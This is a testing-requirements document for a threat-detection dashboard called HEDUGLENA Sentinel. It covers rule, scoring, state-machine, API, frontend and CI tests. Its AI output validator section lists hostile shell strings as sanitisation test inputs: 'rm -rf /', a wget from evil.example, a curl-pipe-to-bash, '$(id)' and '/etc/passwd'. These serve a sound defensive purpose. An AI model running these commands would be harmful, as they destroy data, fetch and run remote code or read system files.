# Testing Requirements — HEDUGLENA Sentinel

---

## Principles

1. Tests are first-class code. They follow the same coding standards as production code.
2. Tests must be deterministic. No test may depend on wall-clock time, real network calls, or real AI provider responses.
3. Tests must be fast. The full unit test suite must complete in < 30 seconds.
4. Every new feature must ship with tests. PRs that add features without tests are blocked.

---

## Coverage Targets

| Scope | Target |
|---|---|
| Backend unit tests | ≥ 80% line coverage |
| Backend integration tests | 100% of API endpoints covered |
| Frontend component tests | Core dashboard components (ThreatGauge, StateDisplay, EventFeed, ActionLog, AIPanel) |
| End-to-end | All 6 demo scenarios (DS-01 through DS-06) |

Coverage is measured by `pytest-cov`. The CI pipeline fails if coverage drops below 80%.

---

## Backend Unit Tests

### Detection rules
For every built-in rule, test:
- Input below threshold → no event emitted.
- Input at exact threshold → event emitted (boundary condition).
- Input above threshold → event emitted with correct severity.
- Rule disabled → no event emitted regardless of input.
- Rule within cooldown → no event emitted even if threshold exceeded.

### Threat scorer
Test:
- Single HIGH event → score in expected range.
- Multiple simultaneous events → score higher than single event.
- Score after time decay (mock time) → score approaches 0.
- Frequency amplification → repeated same-rule events increase score faster.
- Score never exceeds 1.0 regardless of input.
- Score never goes below 0.0 during decay.

### Defense state machine
Test every valid transition:
- RELAXED → ALERT (score crosses 0.25 for dwell_seconds).
- ALERT → DEFENSIVE (score crosses 0.55 for dwell_seconds).
- DEFENSIVE → AGGRESSIVE (score crosses 0.80 for dwell_seconds).
- AGGRESSIVE → DEFENSIVE (score below 0.80 for cooldown_seconds).
- DEFENSIVE → ALERT (score below 0.55 for cooldown_seconds).
- ALERT → RELAXED (score below 0.25 for cooldown_seconds).

Test hysteresis:
- Score briefly crosses threshold then drops — no transition if dwell not met.
- Consecutive descents must each respect individual cooldown windows.

### Response guard
Test:
- `SIMULATE_IP_BLOCK` allowed when `LIVE_ACTIONS=false`.
- `LIVE_PROTECTIVE` action blocked when `LIVE_ACTIONS=false`.
- Action within cooldown window → blocked.
- Action after cooldown expires → allowed.
- `is_simulated` flag is `true` for all simulated actions.

### AI output validator
Test (each with an assert that the output does not contain the input shell string):
- Input containing `rm -rf /`
- Input containing `del /f /q`
- Input containing `wget http://evil.example/payload`
- Input containing `curl https://example.com | bash`
- Input containing `$(id)`
- Input containing `/etc/passwd`
- Input containing `C:\Windows\System32`
- Clean input → returned unchanged.

---

## Backend Integration Tests

Use `pytest` with `httpx.AsyncClient` and an in-memory SQLite database.

### Required endpoint tests

For each endpoint, test at minimum one happy path and one error/edge case:

| Endpoint | Happy Path | Error Case |
|---|---|---|
| `GET /health` | 200 with version | — |
| `GET /api/v1/status` | 200 with state and score | — |
| `GET /api/v1/telemetry/latest` | 200 with sample | 404 if no data yet |
| `GET /api/v1/events` | 200 with list | Empty list on fresh DB |
| `GET /api/v1/score/current` | 200 with score | 404 if no scores |
| `GET /api/v1/state/current` | 200 with state | — |
| `GET /api/v1/rules` | 200 with rule list | — |
| `PUT /api/v1/rules/{id}/disable` | 200 disabled rule | 404 unknown rule ID |
| `POST /api/v1/demo/inject` | 201 with event | 422 unknown event type |
| `POST /api/v1/demo/inject` | 403 when DEMO_MODE=false | — |

### Pipeline integration test
Seed the database with a sequence of telemetry samples that cross the CPU spike threshold.  
Assert:
1. At least one detection event exists with `rule_id = "cpu-spike"`.
2. Threat score > 0.0.
3. Defense state is ALERT or higher.
4. At least one response action exists.
5. At least one AI explanation exists (using NullAdapter).

### WebSocket integration test
Connect a test client to `WS /ws/live`.  
Inject a synthetic event via POST.  
Assert that a WebSocket message with the event ID arrives within 3 seconds.

---

## Frontend Component Tests

Use Vitest + React Testing Library.

### ThreatGauge
- Renders green at score 0.1.
- Renders amber at score 0.4.
- Renders orange at score 0.7.
- Renders red at score 0.9.

### StateDisplay
- Shows correct state label for each of the four states.
- Shows RELAXED → ALERT transition with an up-arrow indicator.

### EventFeed
- Renders a list of detection events.
- Displays severity badge for each event.
- Shows "No events" when list is empty.

### ActionLog
- Displays SIMULATED badge (blue) for simulated actions.
- Displays LIVE badge (orange-red) for live actions.
- Does not display LIVE actions when none are present.

### AIPanel
- Displays explanation text.
- Displays fallback message when explanation is null.

---

## End-to-End Tests (Playwright)

One test per demo scenario. Each test:
1. Starts from RELAXED state (via `/api/v1/demo/reset`).
2. Triggers the scenario.
3. Asserts the expected state transition appears on the dashboard within 60 seconds.
4. Asserts the expected response actions appear in the action log.

---

## Security Tests

Located in `tests/security/`.

- `test_live_actions_guard.py` — assert LIVE_PROTECTIVE actions are blocked when `LIVE_ACTIONS=false`.
- `test_ai_validator.py` — assert all shell and path patterns are stripped.
- `test_demo_mode_guard.py` — assert demo endpoints return 403 when `DEMO_MODE=false`.
- `test_sql_injection.py` — submit payloads with SQL metacharacters; assert 422 and no DB error.
- `test_input_validation.py` — fuzz selected endpoints with malformed JSON, missing fields, oversized payloads.

---

## Performance Tests

Located in `tests/performance/`.

- `test_pipeline_latency.py` — inject 100 telemetry samples sequentially; assert total time < 100 seconds (1s per sample budget).
- `test_api_read_latency.py` — 10 concurrent requests to each read endpoint; assert p95 < 100 ms.

---

## Test Fixtures

`tests/fixtures/`:
- `normal_telemetry.json` — 60 samples representing a quiet system.
- `cpu_spike_telemetry.json` — samples with cpu_percent > 85.
- `auth_failure_sequence.json` — 10 synthetic auth_failure events in 60 seconds.
- `full_escalation_sequence.json` — event sequence that drives RELAXED → AGGRESSIVE.
- `ai_explanation_clean.txt` — a clean AI response to use as a baseline.
- `ai_explanation_dirty.txt` — an AI response containing shell commands; must be sanitized.

---

## CI Requirements

The CI pipeline (GitHub Actions or equivalent) must run:
1. `ruff check .`
2. `mypy --strict backend/`
3. `pytest tests/unit/ --cov=backend --cov-fail-under=80`
4. `pytest tests/integration/`
5. `pytest tests/security/`
6. `bandit -r backend/ -ll` — fail on HIGH severity
7. `npx tsc --noEmit` (frontend type check)
8. `npx vitest run` (frontend unit tests)

All steps must pass for a PR to be mergeable.
